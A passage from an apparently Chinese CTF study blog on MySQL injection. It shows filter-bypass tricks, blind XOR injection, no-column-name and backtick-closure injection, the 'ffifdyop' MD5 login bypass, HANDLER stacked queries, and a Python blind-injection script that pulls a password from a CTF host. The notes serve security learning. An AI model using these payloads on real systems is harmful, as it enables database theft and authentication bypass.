<p>id=1^case(ord(substr(database(),1,1)))when(102)then(2)else(3)end</p>
</blockquote>
<p>第四步：用substr(database() from 1 for 1 )替换逗号</p>
<blockquote>
<p>id=1^case(ord(substr(database()from(1)for(1))))when(102)then(2)else(3)end</p>
</blockquote>
<h1 id="bypass-infromation-schema"><a href="#bypass-infromation-schema" class="headerlink" title="bypass infromation_schema"></a>bypass infromation_schema</h1><p><strong>由于performance_schema过于复杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</strong></p>
<p><strong>schema_auto_increment_columns</strong>，该视图的作用简单来说就是用来对表自增ID的监控,也可以发现我们可以通过该视图获取数据库的表名信息</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="built_in">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="keyword">from</span> sys.schema_auto_increment_columns <span class="built_in">where</span> table_schema=database()--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>sys.schema_table_statistics_with_buffer</strong><br>   可以看到，在上一个视图中并没有出现的表名在这里出现。</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="built_in">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="built_in">where</span> table_schema=database()--+</span><br></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">select <span class="regexp">/**/</span> group_concat(table_name) <span class="regexp">/**/</span> from <span class="regexp">/**/</span> mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>


<p><strong>利用<code>processlist</code>表读取正在执行的sql语句，从而得到表名与列名</strong></p>
<img src="http://img.npfs06.top/20210723105353.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">

<p>例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9ea19d02-b943-4a06-9d06-ee9e316803a0.node4.buuoj.cn/&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">300</span>):</span><br><span class="line">        <span class="comment"># payload = &quot;if((ascii(substr((select (info)  FROM information_schema.processlist limit 0,1),&quot; + str( n + 1) + &quot;,1)) in (&quot; + str(i) + &quot;)),1,0)&quot;</span></span><br><span class="line">        <span class="comment">#SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=&#x27;andmin&#x27;</span></span><br><span class="line">        payload = <span class="string">&quot;if((ascii(substr((select qwbqwbqwbpass FROM qwbtttaaab111e limit 0,1),&quot;</span> + <span class="built_in">str</span>(n + <span class="number">1</span>) + <span class="string">&quot;,1)) in (&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)),1,0)&quot;</span></span><br><span class="line">        <span class="comment">#glzjin666888</span></span><br><span class="line">        r = requests.get(url + <span class="string">&quot;register.php?username=admin&#x27; and &quot;</span> + payload + <span class="string">&quot; and &#x27;1&amp;password=1&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;username&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            print(<span class="built_in">chr</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span>(<span class="string">&quot;success&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            print(<span class="string">&quot;n= &quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot; i= &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;|&quot;</span>+r.text)</span><br></pre></td></tr></table></figure>


<h1 id="substr-database-from-1-for-2"><a href="#substr-database-from-1-for-2" class="headerlink" title="substr(database() from 1 for 2)"></a>substr(database() from 1 for 2)</h1><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">| database() |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">| typecho    |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(database() from 1 for 2);</span><br><span class="line"><span class="code">+---------------------------------+</span></span><br><span class="line">| substr(database() from 1 for 2) |</span><br><span class="line"><span class="code">+---------------------------------+</span></span><br><span class="line">| ty                              |</span><br><span class="line"><span class="code">+---------------------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(database() from 2 for 3);</span><br><span class="line"><span class="code">+---------------------------------+</span></span><br><span class="line">| substr(database() from 2 for 3) |</span><br><span class="line"><span class="code">+---------------------------------+</span></span><br><span class="line">| ype                             |</span><br><span class="line"><span class="code">+---------------------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">#说明前面一个数字是从第几个开始读取，最后的一个数字是读取的长度。</span><br></pre></td></tr></table></figure>


<h1 id="CASE-WHEN"><a href="#CASE-WHEN" class="headerlink" title="CASE WHEN"></a>CASE WHEN</h1><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">简单<span class="keyword">CASE</span> <span class="keyword">WHEN</span>函数：</span><br><span class="line"></span><br><span class="line"><span class="keyword">CASE</span> SCORE <span class="keyword">WHEN</span> <span class="string">&#x27;A&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;优&#x27;</span> <span class="keyword">ELSE</span> <span class="string">&#x27;不及格&#x27;</span> <span class="keyword">END</span></span><br><span class="line"><span class="keyword">CASE</span> SCORE <span class="keyword">WHEN</span> <span class="string">&#x27;B&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;良&#x27;</span> <span class="keyword">ELSE</span> <span class="string">&#x27;不及格&#x27;</span> <span class="keyword">END</span></span><br><span class="line"><span class="keyword">CASE</span> SCORE <span class="keyword">WHEN</span> <span class="string">&#x27;C&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;中&#x27;</span> <span class="keyword">ELSE</span> <span class="string">&#x27;不及格&#x27;</span> <span class="keyword">END</span></span><br><span class="line"></span><br><span class="line"> 等同于，使用<span class="keyword">CASE</span> <span class="keyword">WHEN</span>条件表达式函数实现：</span><br><span class="line"></span><br><span class="line"><span class="keyword">CASE</span> <span class="keyword">WHEN</span> SCORE = <span class="string">&#x27;A&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;优&#x27;</span></span><br><span class="line">     <span class="keyword">WHEN</span> SCORE = <span class="string">&#x27;B&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;良&#x27;</span></span><br><span class="line">     <span class="keyword">WHEN</span> SCORE = <span class="string">&#x27;C&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;中&#x27;</span> <span class="keyword">ELSE</span> <span class="string">&#x27;不及格&#x27;</span> <span class="keyword">END</span></span><br></pre></td></tr></table></figure>


<h1 id="group-by-with-rollup"><a href="#group-by-with-rollup" class="headerlink" title="group by + with rollup"></a>group by + with rollup</h1><p><strong>group by   将结果集中的数据行根据选择列的值进行逻辑分组</strong></p>
<p><strong>with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）</strong></p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select password from test;</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">| password   |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|     1      |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|     2      |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|     3      |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|     1      |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">4 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select password, count(*) from test group by password;</span><br><span class="line"><span class="code">+------------+</span>------------+</span><br><span class="line">|  password  |  count(*)  |</span><br><span class="line"><span class="code">+------------+</span>------------+</span><br><span class="line">|     1      |     2      |</span><br><span class="line"><span class="code">+------------+</span>------------+</span><br><span class="line">|     2      |     1      |</span><br><span class="line"><span class="code">+------------+</span>------------+</span><br><span class="line">|     3      |     1      |</span><br><span class="line"><span class="code">+------------+</span>------------+</span><br><span class="line">3 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select password, count(*) from test group by password with rollup;</span><br><span class="line"><span class="code">+------------+</span>------------+</span><br><span class="line">|  password  |  count(*)  |</span><br><span class="line"><span class="code">+------------+</span>------------+</span><br><span class="line">|     1      |     2      |</span><br><span class="line"><span class="code">+------------+</span>------------+</span><br><span class="line">|     2      |     1      |</span><br><span class="line"><span class="code">+------------+</span>------------+</span><br><span class="line">|     3      |     1      |</span><br><span class="line"><span class="code">+------------+</span>------------+</span><br><span class="line">|    NULL    |     4      |</span><br><span class="line"><span class="code">+------------+</span>------------+</span><br><span class="line">4 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>常见于账号/密码框登入</p>
<p>因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可绕过密码</p>
<h1 id="使-‘-’起到拼接作用"><a href="#使-‘-’起到拼接作用" class="headerlink" title="使 ‘ || ’起到拼接作用"></a>使 ‘ || ’起到拼接作用</h1><p><strong>oracle 支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 不支持。 在mysql里，它只是个 或运算 的符号。或运算符前面是1，则结果为1；或运算符前面是0，则要看后面是1还是0，字符视为0.但是我们可以通过设置sql_mode=pipes_as_concat; 来使  ||  用作拼接的作用</strong></p>
<p><img src="https://img.npfs06.top/20210306101959.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210306102038.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210306102107.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="堆叠注入-预处理语句"><a href="#堆叠注入-预处理语句" class="headerlink" title="堆叠注入 预处理语句"></a>堆叠注入 预处理语句</h1><p>预处理语句使用方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> name <span class="keyword">from</span> <span class="string">&#x27;[my sql sequece]&#x27;</span>;   <span class="operator">/</span><span class="operator">/</span>预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> name;  <span class="operator">/</span><span class="operator">/</span>执行预定义<span class="keyword">SQL</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> <span class="operator">||</span> <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> name;  <span class="operator">/</span><span class="operator">/</span>删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
<p>预定义语句也可以通过变量进行传递:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@tn</span> <span class="operator">=</span> <span class="string">&#x27;hahaha&#x27;</span>;  <span class="operator">/</span><span class="operator">/</span>存储表名</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@sql</span> <span class="operator">=</span> concat(<span class="string">&#x27;select * from &#x27;</span>, <span class="variable">@tn</span>);  <span class="operator">/</span><span class="operator">/</span>存储<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">PREPARE</span> name <span class="keyword">from</span> <span class="variable">@sql</span>;   <span class="operator">/</span><span class="operator">/</span>预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> name;  <span class="operator">/</span><span class="operator">/</span>执行预定义<span class="keyword">SQL</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> <span class="operator">||</span> <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla;  <span class="operator">/</span><span class="operator">/</span>删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>


<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p>来源  <a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank">https://zhuanlan.zhihu.com/p/98206699</a></p>
<p>正常的 sql 查询如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">select * from `admin`;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210306102143.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>其中，列名为 id、name、password，使用 union 查询：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">select 1,2,3 union select * from admin;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210306102157.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from admin)a;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210306102212.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<blockquote>
<p>末尾的 a 可以是任意字符，用于命名。</p>
</blockquote>
<p>当然，多数情况下，<code>会被过滤。当</code> 不能使用的时候，使用别名来代替：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210306102228.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>同时查询多个列：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210306102245.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>简而言之，可以通过任意命名进入该表，然后使用 SELECT 查询这些字段中的任何已知值。</p>
<h1 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h1><blockquote>
<p>两个同为真（假）的条件做异或，结果为假<br>一个条件为真，一个条件为假，结果为真</p>
</blockquote>
<figure class="highlight parser3"><table><tr><td class="code"><pre><span class="line"><span class="xml">^ 运算符会做 位异或运算</span></span><br><span class="line"><span class="number">1</span><span class="keyword">^2</span><span class="xml"> = </span><span class="number">3</span></span><br><span class="line"><span class="number">1</span><span class="keyword">^3</span><span class="xml"> = </span><span class="number">2</span></span><br><span class="line"><span class="number">2</span><span class="keyword">^3</span><span class="xml"> = </span><span class="number">1</span></span><br><span class="line"><span class="number">1</span><span class="keyword">^0</span><span class="xml"> = </span><span class="number">1</span></span><br></pre></td></tr></table></figure>


<p><code>xor</code>做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据  用法:</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">可用于判断过滤</span><br><span class="line">http://<span class="number">120.24</span><span class="number">.86</span><span class="number">.145</span>:<span class="number">9004</span>/1ndex.php?id=<span class="number">1</span>&#x27;^(<span class="built_in">length</span>(&#x27;<span class="built_in">union</span>&#x27;)!=<span class="number">0</span>)--+</span><br><span class="line">如果返回页面显示正常，那就证明<span class="built_in">length</span>(‘<span class="built_in">union</span>’)==<span class="number">0</span>的，也就是<span class="built_in">union</span>被过滤了</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctf_test <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span><span class="operator">^</span>(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>)<span class="operator">^</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctf_test <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span><span class="operator">^</span>(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>)<span class="operator">^</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span> <span class="operator">|</span> pwd     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>    <span class="operator">|</span> flag    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<h1 id="反引号及desc的使用"><a href="#反引号及desc的使用" class="headerlink" title="反引号及desc的使用"></a>反引号及desc的使用</h1><p><strong>反引号在mysql中的作用</strong></p>
<p>反引号 ` 在mysql中是为了区分mysql中的保留字符与普通字符而引入的符号</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="meta">#假如表A中有一列名为select，查询该列</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">select</span> <span class="keyword">from</span> A;   <span class="meta">#错误</span></span><br><span class="line"><span class="keyword">select</span> `<span class="keyword">select</span>` <span class="keyword">from</span> A;  <span class="meta">#正确</span></span><br></pre></td></tr></table></figure>
<p><strong>desc的使用</strong></p>
<p>很多情况下对表内部结构不熟悉，这时可通过<code>desc +表名</code>来查看表结构并将其降序输出</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">#假如存在表flag，用desc(describe)查询该表信息</span><br><span class="line">desc flag A<span class="comment">;  #显示flag表信息，别名为A</span></span><br><span class="line">desc `flag` `A` #与上述语句相同</span><br></pre></td></tr></table></figure>
<h2 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h2><p>题目链接：<a href="http://web.jarvisoj.com:32794/">http://web.jarvisoj.com:32794/</a></p>
<p>Hint: 先找到源码再说吧~~</p>
<p>dirsearch扫描，得到源码：<a href="http://web.jarvisoj.com:32794/index.php">http://web.jarvisoj.com:32794/index.php</a>~</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;table&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;table&#x27;</span>]:<span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$table</span> = Filter(<span class="variable">$table</span>);</span><br><span class="line">mysqli_query(<span class="variable">$mysqli</span>,<span class="string">&quot;desc `secret_<span class="subst">&#123;$table&#125;</span>`&quot;</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select &#x27;flag&#123;xxx&#125;&#x27; from secret_<span class="subst">&#123;$table&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$ret</span> = sql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以通过反引号闭合来进行sql注入</p>
<blockquote>
<p>1.payload: ?table=test`` union select database() limit 1,1</p>
</blockquote>
<p>相当于</p>
<blockquote>
<p>mysqli_query($mysqli,”desc ` secret_test`` union select database()limit 1,1`“) or Hacker();</p>
</blockquote>
<p>得到数据库61d00，接着爆表</p>
<blockquote>
<p>?table=test``union select group_concat(table_name) from information_schema.tables where table_schema = database() limit 1,1</p>
</blockquote>
<p>得到secret_flag,secret_test，接着爆字段：</p>
<blockquote>
<p>?table=test``union select group_concat(column_name) from information_schema.columns where table_name =database() limit 1,1</p>
</blockquote>
<p>得到flagUwillNeverKnow，最后爆出flag：</p>
<blockquote>
<p>?table=test ``union select flagUwillNeverKnow  from secret_flag limit 1,1</p>
</blockquote>
<h1 id="过滤逗号的join注入"><a href="#过滤逗号的join注入" class="headerlink" title="过滤逗号的join注入"></a>过滤逗号的join注入</h1><p>在联合注入的时候，如果被过滤了逗号，会让我们的操作很受限，这时可以使用join连结多个表<br>例如：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c</span><br></pre></td></tr></table></figure>
<p>先是执行三个select形成单个字段的3张表，然后使用join将三张表连结起来，这样就形成了一个有三个字段的一张表，这样就可以绕过逗号过滤，形成多个字段的表</p>
<p><img src="https://img.npfs06.top/20210306102303.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="过滤逗号的mid注入"><a href="#过滤逗号的mid注入" class="headerlink" title="过滤逗号的mid注入"></a>过滤逗号的mid注入</h1><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select user();</span><br><span class="line"><span class="code">+----------------+</span></span><br><span class="line">| user()         |</span><br><span class="line"><span class="code">+----------------+</span></span><br><span class="line">| root@localhost |</span><br><span class="line"><span class="code">+----------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select mid(user() from -1);</span><br><span class="line"><span class="code">+---------------------+</span></span><br><span class="line">| mid(user() from -1) |</span><br><span class="line"><span class="code">+---------------------+</span></span><br><span class="line">| t                   |</span><br><span class="line"><span class="code">+---------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select mid(user() from -2);</span><br><span class="line"><span class="code">+---------------------+</span></span><br><span class="line">| mid(user() from -2) |</span><br><span class="line"><span class="code">+---------------------+</span></span><br><span class="line">| st                  |</span><br><span class="line"><span class="code">+---------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h1 id="limit处的逗号"><a href="#limit处的逗号" class="headerlink" title="limit处的逗号"></a>limit处的逗号</h1><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">limit</span> <span class="number">1</span> offset <span class="number">0</span></span><br></pre></td></tr></table></figure>


<h1 id="过滤了union-select"><a href="#过滤了union-select" class="headerlink" title="过滤了union select"></a>过滤了union select</h1><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">1)双写绕过</span><br><span class="line">unionunion <span class="keyword">select</span> <span class="keyword">select</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>)在<span class="keyword">union</span> 和 <span class="keyword">select</span>之间加其他限定词之类的，比如：<span class="keyword">all</span>，<span class="keyword">distinct</span>，distinctrow</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">distinct</span>/distinctrow <span class="keyword">select</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>)没有过滤<span class="comment">/**/</span>的情况下，也可以使用<span class="comment">/**/</span>绕过</span><br><span class="line"><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span></span><br><span class="line">uni<span class="comment">/**/</span><span class="keyword">on</span> <span class="keyword">select</span></span><br><span class="line"><span class="comment">/*!union*/</span><span class="keyword">select</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>)<span class="keyword">union</span>--%<span class="number">0</span><span class="built_in">e</span>%<span class="number">0</span>aselect</span><br><span class="line"><span class="keyword">union</span>--%<span class="number">0</span><span class="built_in">e</span>%<span class="number">0</span>aselect        --表示注释后面的内容，%<span class="number">0</span><span class="built_in">e</span>删除自身， %<span class="number">0</span>a换行</span><br></pre></td></tr></table></figure>


<h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><p><strong>ffifdyop/129581926211651571912466741651878684928</strong></p>
<p> ffifdyop</p>
<p>经过md5加密后：276f722736c95d99e921722cf9ed621c</p>
<p>再转换为字符串：’or’6&lt;乱码&gt;  即  ‘or’66�]��!r,��b</p>
<p> 用途：</p>
<p>select * from admin where password=’’or’6&lt;乱码&gt;’</p>
<p>就相当于select * from admin where password=’’or 1  实现sql注入</p>
<h1 id="HANDLER"><a href="#HANDLER" class="headerlink" title="HANDLER"></a>HANDLER</h1><p><code>HANDLER ... OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句访问，该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭</p>
<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>
<p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank">官方文档</a></p>
<p>GXYCTF payload:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; handler `FlagHere` open as `a`; handler `a` read next;#</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;HANDLER FlagHere OPEN; HANDLER FlagHere READ FIRST; HANDLER FlagHere CLOSE;#</span></span><br></pre></td></tr></table></figure>




<h1 id="注释符号绕过"><a href="#注释符号绕过" class="headerlink" title="注释符号绕过"></a>注释符号绕过</h1><p>常用的注释符有</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">-- 注释内容</span><br><span class="line"><span class="comment"># 注释内容</span></span><br><span class="line"><span class="regexp">/*注释内容*/</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="comment">-- where id = 1;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> user2    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span 